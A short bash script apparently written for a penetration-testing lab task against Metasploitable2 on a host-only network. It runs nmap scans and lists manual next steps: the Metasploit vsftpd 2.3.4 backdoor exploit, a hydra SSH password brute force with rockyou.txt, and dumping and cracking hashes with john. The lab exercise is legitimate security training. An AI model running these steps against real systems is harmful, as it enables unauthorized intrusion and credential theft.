#!/bin/bash
# recon.sh — Task 4 reconnaissance & exploitation helper commands
# Target: Metasploitable2 on the VirtualBox Host-Only lab network
# Usage: edit TARGET below, then run step by step (not meant to be blindly executed end-to-end)

TARGET="192.168.187.4"   # <-- set your Metasploitable2 IP

echo "[*] Service/version scan on common ports"
nmap -sV -p 21,22,23,25,80,139,445,3306 "$TARGET"

echo "[*] Full TCP port scan"
nmap -sS -p- "$TARGET"

echo "[*] Next steps (run manually):"
echo " 1) msfconsole -> use exploit/unix/ftp/vsftpd_234_backdoor"
echo " 2) hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://$TARGET"
echo " 3) From a root/meterpreter session: hashdump, then john the cracked hashes"
